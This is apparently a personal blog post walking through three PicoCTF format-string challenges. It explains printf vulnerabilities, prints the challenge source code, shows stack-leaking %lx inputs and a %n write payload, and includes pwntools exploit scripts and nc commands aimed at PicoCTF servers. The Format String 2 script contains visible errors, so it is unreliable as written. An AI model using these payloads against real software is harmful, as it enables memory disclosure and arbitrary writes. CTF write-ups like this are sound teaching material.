---
layout: post
title: Week 2 - Format String Attacks from PicoCTF
tags: [year-of-hacking, pwn]
---
This week I took a look at 3 format string challenges in PicoCTF.
# Format string attack introduction
In every computer science student's first introduction to low-level programming in C, they are instructed to use `printf` to display output to the terminal, or `fprintf`/`dprintf` to write to a file or file descriptor. `printf` is a high-level function that is defined in the `libc` C API standard, and its most common implementation is in GNU's `glibc` library, though others exist. The function definition is:
`int printf(const char *restrict format, ...);`
The format argument is a string that can be used define the final format of the data being written, and is frequently used as a teaching tool for demonstrating how different representations of data can mean the same thing. 
The `...` argument is an arbitrary-length list of arguments to be passed to the format string as inputs.

Lets look at some examples:
```C
printf("%x\n", 36); // Convert 36 to hex
printf("%c\n", 36); // Print ascii char with value 36
printf("%lx\n", 0x1234567890abcdef); // Print 64-bit hex number 
printf("%d\n", 0x100); // Print 0x100 in decimal
```

Security issues can arise when an untrusted data source is given control of that format string. Take this example program:
```C
#include <stdio.h>
int main() {
    printf("What's your name? ");
    char inputBuf[256];
    scanf("%s", inputBuf);
    printf("Your name is:\n");
    long int sensitiveItem = 0x1234567890abcdef;
    printf(inputBuf);
    return 0;
}
```
We can compile and run this program with 
```
gcc demo.c -o demo -fno-stack-protector -z execstack -no-pie; ./demo
```
Since we're given control of the format string through the `inputBuf` variable, we can try to set our own format designator to expose data on the stack:
```
What's your name? %x
Your name is:
1f502a0
```

What happened was we made the `inputBuf` string equal to `%x`. Normally this would take the value of the next argument and represent it at as a hex string, but since there are no arguments, it then pops the data off the stack. We can use this to print out the state of the stack using a whole bunch of `%lx` format designators:
```bash
What is your name? %lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,
Your name is:
44a2a0,0,7f7e6a5bbb00,c0,7f7e6a697aa0,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,0,0,0,0,0,0,0,0,0,1234567890abcdef,1,7f7e6a4eb6ca,0,401146,100000000,7fff2b8a4208,7fff2b8a4208,9551d3493ca1e505,0
```
We can see the sensitive data in this mess after that long string of zeroes.

The point is, processing user input in this way can lead to all kinds vulnerabilities. This risk can be minimized by using:
```C
printf("%s", inputBuf);
```
Rather than 
```C
printf(inputBuf);
```
# Format String 0
In this challenge, we get access to a port running a C binary, and the source code of the binary:
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>
  
#define BUFSIZE 32
#define FLAGSIZE 64
  
char flag[FLAGSIZE];
  
void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}
  
int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}
  
void serve_patrick();

void serve_bob();
  
int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your own debugging flag.\n");
        exit(0);
    }
  
    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);
  
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
  
    serve_patrick();
    return 0;
}
  
void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);
  
    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
  ********  if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}
  
void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);
  
    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```

This challenge is pretty easy. We can see that there is a custom function that is called whenever a `SIGSEGV` is thrown. All we have to do is cause a segfault:
```bash
┌──(jakemull㉿leman-russ)-[~/ctf/pico]
└─$ nc mimas.picoctf.net 65265
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```
We are able to cause the segfault because there is no error handling or input validation, allowing us to dump garbage into the stack until the program pops the garbage into `rip` register, sending a `SIGSEGV`.

Here's a very simple `pwntools` python script to do this programmatically
```python
from pwn import *
import sys
  
conn = remote(sys.argv[1], sys.argv[2])
conn.recvuntil(b': ')
  
conn.sendline(b'A' * 128)
  
resp = conn.recvuntil(b'}')
print(resp.decode())
```

# Format String 1
We're provided with a similar setup to the last challenge, an open port running a C binary with the following source code:
```C
#include <stdio.h>

int main() {
  char buf[1024];
  char secret1[64];
  char flag[64];
  char secret2[64];
  
  // Read in first secret menu item
  FILE *fd = fopen("secret-menu-item-1.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret1, 64, fd);
  // Read in the flag
  fd = fopen("flag.txt", "r");
  if (fd == NULL){
    printf("'flag.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(flag, 64, fd);
  // Read in second secret menu item
  fd = fopen("secret-menu-item-2.txt", "r");
  if (fd == NULL){
    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
    return 1;
  }
  fgets(secret2, 64, fd);
  
  printf("Give me your order and I'll read it back to you:\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your order: ");
  printf(buf);
  printf("\n");
  fflush(stdout);
  
  printf("Bye!\n");
  fflush(stdout);
  
  return 0;
}
```

Towards the bottom, there's a `printf` that repeats user inputted data, making it vulnerable to a format string attack to expose the state of the stack. Luckily, the contents of `flag.txt` are loaded into the stack earlier in execution.

The most basic definition of a string is any amount of characters in memory that end with `0x00`. The format designator is `%s`. I first tried to feed `%s` characters to try and expose any cstrings in the stacks, but it didn't yield any useful information:
```bash
┌──(jakemull㉿leman-russ)-[~/ctf/pico/format-string-1]
└─$ nc mimas.picoctf.net 62076
Give me your order and I'll read it back to you:
%s%s%s%s
Here's your order: Here's your order: (null)(null)
Bye!
```
I tried this with a wide range of `%s` designators, and nothing happened. Turns out, the `%s` symbol resolves a pointer on the stack, and then reads it as a string, rather than pulling a string from the stack. We can get around this by pulling the raw bytes from the stack using `%lx`, which prints out the hex representation of the next 64-bit number on the stack. We can get a complete representation of the state of the stack by feeding a truly egregious amount of `%lx` symbols into the program:
```
┌──(jakemull㉿leman-russ)-[~/ctf/pico/format-string-1]
└─$ nc mimas.picoctf.net 62076
Give me your order and I'll read it back to you:
%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,
Here's your order: 402118,0,79beef7a5a00,0,1592880,a347834,7ffc5f170cb0,79beef596e60,79beef7bb4d0,1,7ffc5f170d80,0,0,7b4654436f636970,355f31346d316e34,3478345f33317937,31655f673431665f,7d383130386531,7,79beef7bd8d8,2300000007,206e693374307250,a336c797453,9,79beef7cede9,79beef59f098,79beef7bb4d0,0,7ffc5f170d90,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
Bye!
```

We can take the stack and plug it in to cyberchef for easy processing. By removing anything that doesn't look like a hex representation of printable characters, we get the 5 hex numbers: `7b4654436f636970,355f31346d316e34,3478345f33317937,31655f673431665f,7d383130386531`

Turning the hex representation to printable characters, we get the string: `{FTCocip5_14m1n44x4_31y71e_g41f_}8108e1`. Because of endianness shenanigans, we need to reverse each 64 bit number, resulting in `1e8018}_f14g_e17y13_4x44n1m41_5picoCTF{`, then reverse the order of each number, resulting in the final flag: `picoCTF{4n1m41_57y13_4x4_f14g_e11e8018}`

# Format String 2
The source code for this challenge reveals that all we need to do is set the `sus` variable to `0x67616c66` which is the byte representation of `flag`.

```c
#include <stdio.h>
  
int sus = 0x21737573;
  
int main() {
  char buf[1024];
  char flag[64];
  
  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);
  
  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");
  
    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);
  
    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }
  
  return 0;
}
```

Surprisingly enough, if you have control over the format string, you have arbitrary write access to the entire stack, effectively allowing for remote code execution. I spent a good while trying to use the input string `\x60\x40\x40\x00\x00\x00\x00\x00%14$n` to set the value of `sus` to 4 to progress the development of the exploit. Doing some more digging, however, `pwntools` is actually smart enough to do automatic exploitation! Using the sample code from the official documentation from the `pwntools` `fmtstr` [library](https://docs.pwntools.com/en/stable/fmtstr.html), I can create a simple python script that automates the exploitation development process:
```python
from pwn import **

context.binary = ELF('./vuln')

p = remote('rhea.picoctf.net', 53865)

# Function to send payload to target
def exec_fmt(payload): 
	p = remote('rhea.picoctf.net', 53865)
	p.sendline(payoad)
	return p.recvall()

autofmt = FmtStr(exec_fmt) # Create exploit automater
offset = autofmt.offset

# Key-value pairs for addresses and their final value after exploit
writes = {
	0x404060: 0x67616c66
}payload = fmtstr_payload(offset, writes)

flag = p.recvall()

print(flag)
print(payload)
```
With the output being:
```bash
┌──(jakemull㉿leman-russ)-[~/ctf/pico/format-string-2]
└─$ python3 pwn.py
b"You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\nHere's your input:                                                                                                      uc    \x00                                                                                                                                                                                                                                                    \x00aaaaba`@@\nI have NO clue how you did that, you must be a wizard. Here you go...\npicoCTF{f0rm47_57r?_f0rm47_m3m_ccb55fce}"
b'%102c%20$llnc%21$hhn%5c%22$hhn%245c%23$hhnaaaaba`@@\x00\x00\x00\x00\x00c@@\x00\x00\x00\x00\x00a@@\x00\x00\x00\x00\x00b@@\x00\x00\x00\x00\x00'
```

This garbled mess contains the flag: `picoCTF{f0rm47_57r?_f0rm47_m3m_ccb55fce}`, and the final payload is:
```
%102c%20$llnc%21$hhn%5c%22$hhn%245c%23$hhnaaaaba`@@\x00\x00\x00\x00\x00c@@\x00\x00\x00\x00\x00a@@\x00\x00\x00\x00\x00b@@\x00\x00\x00\x00\x00
```
We can test this using the commands:
```bash
 python3 -c 'print("%102c%20$llnc%21$hhn%5c%22$hhn%245c%23$hhnaaaaba`@@\x00\x00\x00\x00\x00c@@\x00\x00\x00\x00\x00a@@\x00\x00\x00\x00\x00b@@\x00\x00\x00\x00\x00")' > payload.txt
cat payload.txt | nc rhea.picoctf.net 58955
```
Knowing the shape of the final payload, I'm glad that someone figured all this out before me, though I would like to be able to do it by hand eventually. I'm frequently impressed with how clever pwntools can be. We ought to watch out so it doesn't become sentient.